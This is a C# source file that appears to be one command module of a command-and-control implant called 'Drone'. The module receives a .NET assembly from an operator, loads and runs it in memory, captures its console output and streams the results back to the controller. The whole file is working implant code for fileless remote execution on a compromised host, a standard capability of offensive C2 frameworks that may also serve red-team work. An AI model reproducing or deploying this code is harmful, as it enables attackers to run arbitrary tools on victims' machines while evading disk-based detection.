using System;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class ExecuteAssembly : DroneCommand
{
    public override byte Command => 0x3F;
    public override bool Threaded => true;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        using var ms = new MemoryStream();
        using var sw = new StreamWriter(ms) { AutoFlush = true };
        
        // hijack console output
        var stdOut = Console.Out;
        var stdErr = Console.Error;
        
        Console.SetOut(sw);
        Console.SetError(sw);

        var t = new Thread(() =>
        {
            // load and run assembly
            var asm = Assembly.Load(task.Artefact);
            
            // this will block
            asm.EntryPoint.Invoke(null, new object[] { task.Arguments });
        });
        
        t.Start();
        
        // send a task running
        await Drone.SendTaskRunning(task.Id);

        // whilst assembly is executing
        // keep looping and reading stream

        byte[] output;
        
        do
        {
            // check cancellation token
            if (cancellationToken.IsCancellationRequested)
            {
                t.Abort();
                break;
            }

            output = ReadStream(ms);

            if (output.Length > 0)
                await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, output));

            Thread.Sleep(100);
            
        } while (t.IsAlive);
        
        // after task has finished, do a final read
        output = ReadStream(ms);
        
        // restore console
        Console.SetOut(stdOut);
        Console.SetError(stdErr);
        
        await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, output));
    }

    private static byte[] ReadStream(MemoryStream ms)
    {
        var output = ms.ToArray();

        if (output.Length > 0)
            ms.Clear();

        return output;
    }
}